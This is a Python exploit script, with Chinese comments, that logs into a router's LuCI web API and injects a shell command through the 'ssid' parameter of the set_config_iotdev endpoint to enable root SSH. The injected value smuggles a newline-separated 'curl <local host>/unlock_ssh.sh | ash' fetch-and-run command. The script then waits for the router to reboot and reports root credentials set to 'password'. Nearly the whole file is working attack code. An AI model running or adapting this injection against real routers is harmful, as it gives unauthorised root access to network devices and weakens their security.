#!/usr/bin/env python3
"""通过命令注入开启路由器 SSH"""

import json
import sys
import urllib.request
import hashlib
import random
import time
import argparse
import urllib.parse
import socket

KEY = "a2ffa5c9be07488bbb04a3a47d3c5f6a"


def login(ip: str, pwd: str) -> str:
    ts = int(time.time())
    nonce = f"0__{ts}_{random.randint(0,9999)}"
    inner = hashlib.sha1((pwd + KEY).encode()).hexdigest()
    pw_hash = hashlib.sha1((nonce + inner).encode()).hexdigest()
    url = (f"http://{ip}/cgi-bin/luci/api/xqsystem/login"
           f"?username=admin&logtype=2&nonce={nonce}"
           f"&password={pw_hash}&init=0")
    r = json.loads(urllib.request.urlopen(url).read())
    if r.get('code') != 0:
        raise Exception(f"登录失败: {r}")
    return r['token']


def wait_reboot(ip: str, timeout: int = 120) -> dict:
    """等待路由器重启并检查 SSH 是否可用"""
    print(json.dumps({"status": "等待路由器断开…"}), file=sys.stderr)
    start = time.time()

    # 阶段 1: 等待路由器离线（reboot 触发）
    offline = False
    while time.time() - start < timeout:
        try:
            s = socket.create_connection((ip, 80), timeout=2)
            s.close()
            time.sleep(2)
        except (OSError, socket.timeout):
            offline = True
            elapsed = int(time.time() - start)
            print(json.dumps({"status": f"路由器已离线 ({elapsed}s)"}), file=sys.stderr)
            break

    if not offline:
        return {"error": "路由器未重启，注入可能失败"}

    # 阶段 2: 等待路由器上线并检查 SSH 端口
    print(json.dumps({"status": "等待路由器重启完成…"}), file=sys.stderr)
    ssh_ok = False
    http_ok = False
    while time.time() - start < timeout:
        # 检查 HTTP
        if not http_ok:
            try:
                s = socket.create_connection((ip, 80), timeout=2)
                s.close()
                http_ok = True
                print(json.dumps({"status": "HTTP 已恢复"}), file=sys.stderr)
            except (OSError, socket.timeout):
                pass

        # 检查 SSH
        if not ssh_ok:
            try:
                s = socket.create_connection((ip, 22), timeout=2)
                s.close()
                ssh_ok = True
                elapsed = int(time.time() - start)
                print(json.dumps({"status": f"SSH 已就绪 ({elapsed}s)"}), file=sys.stderr)
            except (OSError, socket.timeout):
                pass

        if ssh_ok:
            break
        time.sleep(2)

    return {
        "ssh": ssh_ok,
        "http": http_ok,
        "elapsed_sec": int(time.time() - start),
    }


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='通过命令注入开启路由器 SSH',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            '示例:\n'
            '  python3 enable_ssh.py --stok xxx --local-ip 192.168.31.226\n'
            '  python3 enable_ssh.py --local-ip 192.168.31.226 --pwd 12345678\n'
        ))
    parser.add_argument('--stok', help='已登录的 stok')
    parser.add_argument('--ip', default='192.168.31.1', help='路由器 IP (默认: 192.168.31.1)')
    parser.add_argument('--pwd', help='管理密码 (不传 --stok 时使用)')
    parser.add_argument('--local-ip', required=True, help='本机 IP（chfs 所在机器）')
    parser.add_argument('--wait', action='store_true', help='等待路由器重启并验证 SSH')
    args = parser.parse_args()

    stok = args.stok
    if not stok:
        if not args.pwd:
            args.pwd = input('管理密码: ')
        stok = login(args.ip, args.pwd)

    # 构造注入命令
    script_url = f"http://{args.local_ip}/chfs/shared/unlock_ssh.sh?v=1"
    cmd = f"curl {script_url} | ash"
    ssid = "-h\n" + cmd + "\n"

    params = urllib.parse.urlencode({
        'bssid': 'gallifrey',
        'user_id': 'doctor',
        'ssid': ssid,
    })

    url = (f"http://{args.ip}/cgi-bin/luci/;stok={stok}"
           f"/api/misystem/set_config_iotdev?{params}")

    print(json.dumps({"status": "发送注入请求…"}), file=sys.stderr)

    try:
        r = json.loads(urllib.request.urlopen(url, timeout=15).read())
    except Exception as e:
        print(json.dumps({"warn": f"请求异常（路由器可能已立即重启）: {e}"}), file=sys.stderr)
        r = {"code": 0}

    result = {
        "stok": stok,
        "command": cmd,
    }

    if r.get('code') == 0:
        result["inject_ok"] = True
        result["msg"] = "注入请求已发送，等待路由器执行…"
    else:
        result["inject_ok"] = False
        result["error"] = f"注入请求返回异常: {r}"
        print(json.dumps(result))
        sys.exit(1)

    if args.wait:
        check = wait_reboot(args.ip)
        result["ssh_ok"] = check["ssh"]
        result["http_ok"] = check["http"]
        result["elapsed_sec"] = check["elapsed_sec"]
        if not check["ssh"]:
            result["error"] = f"等待超时，SSH 未就绪"
            print(json.dumps(result))
            sys.exit(1)
    else:
        result["msg"] = "注入成功，路由器即将重启（加 --wait 可等待验证 SSH）"

    result["ssh_user"] = "root"
    result["ssh_pwd"] = "password"
    print(json.dumps(result))
